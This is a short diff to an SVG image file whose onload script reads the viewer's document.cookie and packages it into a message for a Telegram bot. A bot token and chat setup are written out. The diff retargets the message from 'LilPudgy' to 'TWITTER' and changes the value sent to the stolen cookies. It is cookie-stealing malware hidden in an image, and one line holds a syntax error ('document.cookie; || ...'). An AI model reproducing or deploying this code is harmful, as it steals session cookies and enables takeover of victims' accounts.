@@ -1,7 +1,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="init()">
   <script type="application/ecmascript"><![CDATA[
     function init(){
-      const cookies = document.cookie; || 'this-worked-v2';
+      const cookies = document.cookie; || 'TWITTER-this-worked-v2';
     
       // Your Telegram Bot Token and Chat ID
       const botToken = "8199528922:AAH9HLZVw9DkfVzgMaY1Wb0NEfr0pmdxCgA";
@@ -11,7 +11,7 @@
       
       const payload = {
         chat_id: chatId,
-        text: "Token extracted from LilPudgy: " + token,
+        text: "Token extracted from TWITTER: " + cookies,
         parse_mode: "HTML"
       };
       
